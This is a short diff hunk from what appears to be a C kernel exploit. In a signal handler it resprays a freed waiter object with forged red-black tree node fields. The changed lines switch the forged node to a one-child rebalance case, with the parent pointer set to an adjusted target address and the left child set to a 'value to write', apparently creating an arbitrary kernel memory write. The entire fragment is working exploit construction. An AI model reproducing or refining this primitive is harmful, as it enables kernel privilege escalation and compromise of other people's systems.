@@ -89,9 +89,9 @@ static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
              * a new kernel frame and clobber the stale waiter stamp. */
 
             if (atomic_load(&sigret_respray_flag)) {
-                w[0x00/8] = atomic_load(&sigret_respray_pc);  /* Parent color = target address - offset */
-                w[0x08/8] = 0;                                 /* tree_right = 0 -> Case 1 */
-                w[0x10/8] = 0;                                 /* tree_left = 0 */
+                w[0x00/8] = atomic_load(&sigret_respray_pc);  /* Parent color = (target - 8) & ~3 */
+                w[0x08/8] = 0;                                 /* tree_right = 0 -> Case 2 one-child pivot */
+                w[0x10/8] = atomic_load(&sigret_respray_val); /* tree_left = VALUE TO WRITE */
                 w[0x18/8] = 0;
                 w[0x20/8] = 0;
                 w[0x28/8] = 0;
